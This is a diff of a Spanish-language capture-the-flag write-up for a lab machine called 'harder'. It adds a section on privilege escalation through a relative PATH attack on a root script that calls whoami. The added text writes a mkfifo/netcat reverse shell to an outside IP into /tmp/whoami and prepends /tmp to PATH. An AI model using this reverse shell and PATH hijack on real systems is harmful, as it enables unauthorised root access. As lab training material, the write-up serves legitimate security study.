@@ -142,7 +142,7 @@ Analizamos los ficheros, estos tres ficheros son los encargador del panel de log
 Enlace funcion hash_mac --> https://www.php.net/manual/es/function.hash-hmac.php)
 
 
-## Explotando/Bypass funcion hash_mac PHP
+## Bypass funcion hash_mac PHP
 
 Fichero hmac.php, lo esplicaremos por secciones.
 
@@ -489,5 +489,53 @@ Ejecutamos el binario para que realize todo el proceso.
 ---
 
 
-### Metodo 2: Mediante firma GNU Privacy Guard (GPG)
+### Metodo 2: Mediante Ataque Relative PATH
+
+--Vemos que el script ejecuta el comando whoami para mostrar el nombre de usuario que ejecuta el script, haciendo uso de la variable PATH del sistema, no utiliza su ruta absoluta /usr/bin/whoami.	
+
+	 harder:/usr/local/bin$ cat run-crypted.sh 
+		#!/bin/sh
+		
+		if [ $# -eq 0 ]
+		  then
+		    echo -n "[*] Current User: ";
+	  ***====>  whoami;
+		    echo "[-] This program runs only commands which are encypted for root@harder.local using gpg."
+		    echo "[-] Create a file like this: echo -n whoami > command"
+		    echo "[-] Encrypt the file and run the command: execute-crypted command.gpg"
+		  else
+		    export GNUPGHOME=/root/.gnupg/
+		    gpg --decrypt --no-verbose "$1" | ash
+		fi
+  
+	harder:/usr/local/bin$ run-crypted.sh 
+		[*] Current User: evs  <=============*******
+		[-] This program runs only commands which are encypted for root@harder.local using gpg.
+		[-] Create a file like this: echo -n whoami > command
+		[-] Encrypt the file and run the command: execute-crypted command.gpg
+
+---	
+Por lo que vemos podemos crear un binario llamado "whoami" en el directorio /tmp que contenga una reverse shell y seguidamente anadir al inicio del  PATH la ruta tmp: , cuando se ejecute el script e intente ejecutar el comando whoami este buscara en la variable PATH del sistema de manera ordenada, encontrara primero nuestro binario whoami situado en /tmp  ejecutando asi la reverse shell como root, en teoria.
+---
+
+--Creamos el binario en tmp y damos permiso de ejecucion
+
+	harder:/usr/local/bin$ echo -n 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.54.226 1988 >/tmp/f' > /tmp/whoami
+
+	harder:/usr/local/bin$ chmod 777 /tmp/whoami 
+
+ --Modificamos el PATH
+
+	harder:/tmp$ echo $PATH
+		/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+ 
+	harder:/tmp$ export PATH=/tmp:$PATH
+ 
+	harder:/tmp$ echo $PATH
+		/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+  --
+
+
+
 
